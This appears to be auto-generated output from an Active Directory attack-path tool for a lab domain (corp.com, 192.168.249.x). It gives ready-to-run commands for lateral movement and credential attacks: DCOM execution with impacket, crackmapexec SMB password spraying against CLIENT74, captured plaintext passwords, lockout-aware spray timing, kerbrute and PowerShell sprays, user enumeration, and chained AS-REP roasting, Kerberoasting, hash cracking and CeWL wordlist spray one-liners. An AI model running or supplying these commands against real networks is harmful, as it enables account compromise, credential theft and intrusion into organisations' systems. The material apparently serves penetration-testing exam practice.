## DCOM Execution (ExecuteDCOM)

1 users, 1 unique target groups

### Group 1: 1 user(s) → 1 target(s)

**Users:** `jen`

**Targets:**

- `CLIENT74.CORP.COM` (192.168.249.74)

#### File-based commands

```bash
# Create user and target files
echo -e "jen" > users_g1.txt
echo -e "192.168.249.74" > targets_g1.txt
impacket-dcomexec 'CORP/users_g1.txt:<PASSWORD>'@targets_g1.txt
```

#### Inline bash loop

```bash
for user in jen; do
  for target in 192.168.249.74; do
    impacket-dcomexec 'CORP/$user:<PASSWORD>'@$target
  done
done
```

## Monolithic Spray

One attempt per user on their best target. Set `PASSWORD` once at the top.

### Edge Selection Logic

```
  7 users via AdminTo (local admin → SMB auth)
  0 users via CanRDP (RDP → xfreerdp3 auth) - 4 avoided (had better options)
  Priority: AdminTo > CanPSRemote > CanRDP > ExecuteDCOM > ReadLAPSPassword
  Each user sprayed exactly once on their highest-privilege target
```

### Commands

```bash
PASSWORD='<PASSWORD>'

# --- administrator → 192.168.249.74 (CLIENT74) ---
# AdminTo via domain admins: MATCH (administrator)-[:MemberOf*]->(domain admins)-[:AdminTo]->(CLIENT74)
crackmapexec smb 192.168.249.74 -u administrator -p "$PASSWORD"

# --- dave → 192.168.249.74 (CLIENT74) ---
# AdminTo (direct): MATCH (dave)-[:AdminTo]->(CLIENT74)
crackmapexec smb 192.168.249.74 -u dave -p "$PASSWORD"

# --- jeff → 192.168.249.74 (CLIENT74) ---
# AdminTo (direct): MATCH (jeff)-[:AdminTo]->(CLIENT74)
# Note: User also has CanRDP, using AdminTo instead
crackmapexec smb 192.168.249.74 -u jeff -p "$PASSWORD"

# --- jeffadmin → 192.168.249.74 (CLIENT74) ---
# AdminTo via domain admins: MATCH (jeffadmin)-[:MemberOf*]->(domain admins)-[:AdminTo]->(CLIENT74)
# Note: User also has CanRDP, using AdminTo instead
crackmapexec smb 192.168.249.74 -u jeffadmin -p "$PASSWORD"

# --- jen → 192.168.249.74 (CLIENT74) ---
# AdminTo (direct): MATCH (jen)-[:AdminTo]->(CLIENT74)
# Note: User also has CanRDP, using AdminTo instead
crackmapexec smb 192.168.249.74 -u jen -p "$PASSWORD"

# --- leon → 192.168.249.74 (CLIENT74) ---
# AdminTo (direct): MATCH (leon)-[:AdminTo]->(CLIENT74)
# Note: User also has CanRDP, using AdminTo instead
crackmapexec smb 192.168.249.74 -u leon -p "$PASSWORD"

# --- stephanie → 192.168.249.74 (CLIENT74) ---
# AdminTo (direct): MATCH (stephanie)-[:AdminTo]->(CLIENT74)
crackmapexec smb 192.168.249.74 -u stephanie -p "$PASSWORD"

```

---

> **NOTE:** Replace `<PASSWORD>` with actual credentials.


## 🔑 Password Spray Recommendations

### Captured Passwords

```
Strawberry1
Flowers1
HomeTaping199!
```

### Password Policy

- Lockout threshold: **5** attempts
- Lockout duration: **30** minutes
- Safe to spray: **4** passwords every **30** min

### Spray Methods

#### Method 1: SMB-Based Spray (crackmapexec/netexec)

Ports: 445 | Noise: HIGH

```bash
crackmapexec smb 192.168.249.70 -u users.txt -p 'Strawberry1' -d corp.com --continue-on-success
```
```bash
crackmapexec smb 192.168.249.70 -u users.txt -p 'Flowers1' -d corp.com --continue-on-success
```
- ✅ Shows admin access (Pwn3d!), validates creds + checks admin in one step
- ❌ Very noisy (Event logs 4625), triggers lockouts, detected by EDR

#### Method 2: Kerberos TGT-Based Spray (kerbrute)

Ports: 88 | Noise: LOW

```bash
kerbrute passwordspray -d corp.com --dc 192.168.249.70 users.txt 'Strawberry1'
```
```bash
kerbrute passwordspray -d corp.com --dc 192.168.249.70 users.txt 'Flowers1'
```
- ✅ Fastest, stealthiest - only 2 UDP frames per attempt, pre-auth check avoids lockouts for invalid users
- ❌ No admin check (just validates creds), requires valid userlist, Kerberos only

#### Method 3: LDAP/ADSI-Based Spray (PowerShell)

Ports: 389, 636 | Noise: MEDIUM

```bash
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Strawberry1' -Verbose
```
```bash
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Flowers1' -Verbose
```
- ✅ Built into Windows - no external tools needed, uses native APIs, scriptable
- ❌ Windows-only, slower than Kerberos, requires PowerShell access on target

### User Enumeration

**Enumerate valid users via Kerberos pre-auth**
```bash
kerbrute userenum -d corp.com --dc 192.168.249.70 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt && cut -d' ' -f8 valid_users.txt | cut -d'@' -f1 > users.txt
```

**LDAP enumeration with credentials**
```bash
ldapsearch -x -H ldap://192.168.249.70 -D 'corp.com\IIS_SERVICE' -w '<PASSWORD>' -b '<DOMAIN_DN>' '(objectClass=user)' sAMAccountName | grep sAMAccountName | cut -d' ' -f2 > users.txt
```

**CME user enumeration (authenticated)**
```bash
crackmapexec smb 192.168.249.70 -u 'IIS_SERVICE' -p '<PASSWORD>' -d corp.com --users | awk '{print $5}' | grep -v '\[' > users.txt
```

**Export users from BloodHound Neo4j (clean output)**
```bash
echo "MATCH (u:User) WHERE u.name IS NOT NULL AND NOT u.name STARTS WITH 'NT AUTHORITY' RETURN u.samaccountname" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' > users.txt
```

**RPC user enumeration**
```bash
rpcclient -U 'IIS_SERVICE%<PASSWORD>' 192.168.249.70 -c 'enumdomusers' | grep -oP '\[.*?\]' | tr -d '[]' | cut -d' ' -f1 > users.txt
```

**enum4linux user enumeration (unauthenticated if allowed)**
```bash
enum4linux -U 192.168.249.70 | grep 'user:' | cut -d':' -f2 | awk '{print $1}' > users.txt
```

### Spray One-Liners

**1. Full Neo4j Spray (Stealth)**
_Export non-pwned users + passwords from Neo4j, spray with kerbrute_
```bash
echo "MATCH (u:User) WHERE (u.pwned IS NULL OR u.pwned = false) AND u.enabled = true AND u.name IS NOT NULL AND NOT u.name STARTS WITH 'NT AUTHORITY' RETURN u.samaccountname" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' > targets.txt && echo "MATCH (u:User) WHERE u.pwned = true UNWIND u.pwned_cred_values AS cred RETURN cred" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' | sort -u > spray_passwords.txt && for p in $(cat spray_passwords.txt); do kerbrute passwordspray -d corp.com --dc 192.168.249.70 targets.txt "$p"; sleep 1800; done
```

**2. Neo4j Spray + Admin Check (CME)**
_Export from Neo4j, spray with CME to identify admin access (Pwn3d!)_
```bash
echo "MATCH (u:User) WHERE (u.pwned IS NULL OR u.pwned = false) AND u.enabled = true RETURN u.samaccountname" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' > targets.txt && echo "MATCH (u:User) WHERE u.pwned = true UNWIND u.pwned_cred_values AS cred RETURN cred" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | sort -u > spray_passwords.txt && crackmapexec smb 192.168.249.70 -u targets.txt -p spray_passwords.txt -d corp.com --continue-on-success --no-bruteforce
```

**3. AS-REP Roast → Crack → Spray**
_Roast AS-REP users, crack hashes, spray cracked passwords_
```bash
impacket-GetNPUsers -dc-ip 192.168.249.70 -request -outputfile asrep.txt corp.com/ && hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --show | cut -d':' -f2 >> spray_passwords.txt && crackmapexec smb 192.168.249.70 -u users.txt -p spray_passwords.txt -d corp.com --continue-on-success --no-bruteforce
```

**4. Kerberoast → Crack → Spray**
_Kerberoast SPNs, crack TGS hashes, spray cracked passwords_
```bash
impacket-GetUserSPNs -dc-ip 192.168.249.70 -request -outputfile kerberoast.txt 'corp.com/IIS_SERVICE:Strawberry1' && hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --show | cut -d':' -f2 >> spray_passwords.txt && crackmapexec smb 192.168.249.70 -u users.txt -p spray_passwords.txt -d corp.com --continue-on-success --no-bruteforce
```

**5. CeWL → Mutate → Spray**
_Generate wordlist from website, apply mutations, spray_
```bash
cewl -d 2 -m 5 -w cewl_words.txt <TARGET_URL> && hashcat --stdout -r /usr/share/hashcat/rules/best64.rule cewl_words.txt | sort -u > spray_passwords.txt && kerbrute passwordspray -d corp.com --dc 192.168.249.70 users.txt spray_passwords.txt
```

> **EXAM TIP:** Before spraying, check `net accounts` for lockout policy.
